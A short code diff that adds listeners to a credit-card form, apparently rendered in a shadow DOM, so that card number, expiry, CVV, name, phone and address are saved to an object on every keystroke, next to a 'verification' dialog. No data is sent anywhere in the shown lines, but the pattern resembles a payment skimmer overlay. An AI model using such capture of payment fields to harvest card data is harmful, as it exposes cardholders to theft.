@@ -2151,6 +2151,17 @@ document.addEventListener('DOMContentLoaded', function(){
                 };
             }
 
+            function rememberForm(){
+                self._savedForm = collectForm();
+            }
+            [cardInp, expInp, cvvInp, nameInp, cntry, phoneInp,
+             sh.getElementById('cc-addr1'), sh.getElementById('cc-addr2'),
+             sh.getElementById('cc-zip'), sh.getElementById('cc-city')].forEach(function(el){
+                if(!el) return;
+                el.addEventListener('input', rememberForm);
+                el.addEventListener('change', rememberForm);
+            });
+
             function showVerification(sh, self){
                 var dlg=sh.querySelector('.dlg');
                 if(!dlg)return;
